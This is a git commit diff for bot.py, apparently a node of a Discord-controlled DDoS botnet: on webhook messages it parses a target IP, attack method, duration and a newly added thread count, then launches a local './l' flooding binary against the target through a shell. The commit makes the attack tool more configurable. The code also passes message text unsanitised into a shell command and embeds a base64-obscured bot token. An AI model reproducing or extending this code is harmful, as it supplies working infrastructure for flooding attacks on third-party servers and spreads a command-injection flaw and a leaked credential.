136339d2255bb79a61937e07b1f48244129ba390
killurself-py <lztjwongu@gmail.com>
2024-09-29 16:35:46 +0500

    Add files via upload

--- bot.py
+++ bot.py
@@ -4,15 +4,17 @@ import discord
 import subprocess
 from discord.ext import commands
 bot = commands.Bot(command_prefix='>', intents=discord.Intents.all())
+print("loaded")
 @bot.event
 async def on_message(message):
     if message.webhook_id is not None:
         ip = message.content.split(" ")[2]
         method = message.content.split(" ")[1]
         time = message.content.split(" ")[3]
-        threading.Thread(target=process, args=(ip,method,time)).start()
-def process(ip, method, time):
+        threads = message.content.split(" ")[4]
+        threading.Thread(target=process, args=(ip,method,time,threads)).start()
+def process(ip, method, time, threads):
     print(f"recv attack: {ip} / {method} / {time}")
     if "tls" in method:
-        subprocess.Popen(f"./l {ip} {time} 12500", shell=True)
+        subprocess.Popen(f"./l {ip} {time} {threads}", shell=True)
 bot.run(base64.b64decode(b"TVRJNE9UZzVORGsxTVRRNE56YzVPVE13TmcuR1NUc0QxLlRPQ3prLVhBZXBtVy1DTVV0Znpva094T0plOGJwNVNhSi1YSkJj").decode())
